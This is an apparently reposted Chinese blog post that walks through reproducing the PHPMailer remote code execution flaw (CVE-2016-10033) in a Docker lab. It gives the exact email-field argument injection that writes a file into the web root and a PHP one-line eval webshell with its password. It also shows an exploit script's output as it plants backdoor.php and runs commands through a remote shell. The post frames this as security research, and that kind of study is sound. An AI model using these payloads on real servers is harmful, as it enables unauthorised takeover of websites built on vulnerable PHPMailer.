> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/iYUGj-iOOv6oHdex36L4GA)

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcdntSN0777tibEtD1YhnxdlMU7s4ds5JHkq2jcVRvsSykcauDh23SDngsKpvO3nbWyW5HFe5VWDWA/640?wx_fmt=png)

PHPMailer 远程命令执行漏洞复现

一、漏洞简介

PHPMailer 是 PHP 电子邮件创建及传输类，用于多个开源项目：WordPress, Drupal, 1CRM, SugarCRM, Yii, Joomla! 等。

PHPMailer < 5.2.18 版本存在安全漏洞，可使未经身份验证的远程攻击者在 Web 服务器用户上下文中执行任意代码，远程控制目标 web 应用。

二、影响版本：

PHPMailer<5.2.18

三、漏洞复现

Docker 环境：

```
docker run --rm -it -p 8080:80 vulnerables/cve-2016-10033
```

拉去镜像启动环境：

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcdntSN0777tibEtD1YhnxdlxoXNRlsZ9tLymuiaY2pfXFjCnQiakRnqLJpA1ArEQd8pJ3X3oDcuBjww/640?wx_fmt=png)

http://192.168.1.107:8080/

```
http://192.168.1.107:8080/
在name处随便输入比如“aaa”，在email处输入：

"aaa". -OQueueDirectory=/tmp/. -X/var/www/html/a.php @aaa.com
在message处输入一句话木马：

<?php @eval($_POST['thelostworld']); ?> 
```

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcdntSN0777tibEtD1YhnxdlNdXU5ZdmARDf3YdMwDfryK6ibibVal7ibO2c6EzWAFbbiay9P8XF242jSw/640?wx_fmt=png)

上传完一句话木马后，页面会响应 3-5 分钟，响应时间较长

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcdntSN0777tibEtD1YhnxdlQzNqeHZKib4Jia2Geiaic4CSCSkb0NJw1CMibtUwVZjrqaqQVn2DtMkiaxTA/640?wx_fmt=png)

木马地址：http://192.168.1.107:8080/a.php 密码：thelostworld

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcdntSN0777tibEtD1YhnxdlL4mp3kudzvwXdvC0bNvA7hibpmRfkrWhDLEdqZQVX5Y8SOkYOUcO3SA/640?wx_fmt=png)

 虚拟终端：

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcdntSN0777tibEtD1Yhnxdlrc7gRmfZibjaA1cicczYUaTHsUN5icwJ2iaT5Z9afAaB8ibvxR6Rn8qo6wQ/640?wx_fmt=png)

使用脚本：

获取脚本后台回复 “PHPMailer” 获取脚本  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcdntSN0777tibEtD1YhnxdlWaPZG2xdjmFpPibVDfYGGNYUOvycF3mvJ1lAh6YOsS2gr7zNTfSH0ew/640?wx_fmt=png)

```
➜  Desktop ./exploit.sh 192.168.1.107:8080
[+] CVE-2016-10033 exploit by opsxcq
[+] Exploiting 192.168.1.107:8080


[+] Target exploited, acessing shell at http://192.168.1.107:8080/backdoor.php
[+] Checking if the backdoor was created on target system
[+] Backdoor.php found on remote system
[+] Running whoami
www-data
RemoteShell> [+] Running 


RemoteShell> id
[+] Running id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

访问木马地址：  

http://192.168.1.107:8080/backdoor.php

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcdntSN0777tibEtD1YhnxdlZ3D1JEialeLzlBeMVzS2JUMVWV4cgCYcH1PibydYaMg3EDFqehia13WicQ/640?wx_fmt=png)

参考：

https://www.cnblogs.com/Hi-blog/p/7812008.html

https://www.exploit-db.com/exploits/40968

免责声明：本站提供安全工具、程序 (方法) 可能带有攻击性，仅供安全研究与教学之用，风险自负!  

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

订阅查看更多复现文章、学习笔记

thelostworld

安全路上，与你并肩前行！！！！

![](https://mmbiz.qpic.cn/mmbiz_jpg/uljkOgZGRjeUdNIfB9qQKpwD7fiaNJ6JdXjenGicKJg8tqrSjxK5iaFtCVM8TKIUtr7BoePtkHDicUSsYzuicZHt9icw/640?wx_fmt=jpeg)

个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns

个人简书：https://www.jianshu.com/u/bf0e38a8d400

个人 CSDN：https://blog.csdn.net/qq_37602797/category_10169006.html

个人博客园：https://www.cnblogs.com/thelostworld/

FREEBUF 主页：https://www.freebuf.com/author/thelostworld?type=article

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcW6VR2xoE3js2J4uFMbFUKgglmlkCgua98XibptoPLesmlclJyJYpwmWIDIViaJWux8zOPFn01sONw/640?wx_fmt=png)

欢迎添加本公众号作者微信交流，添加时备注一下 “公众号”  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcSQn373grjydSAvWcmAgI3ibf9GUyuOCzpVJBq6z1Z60vzBjlEWLAu4gD9Lk4S57BcEiaGOibJfoXicQ/640?wx_fmt=png)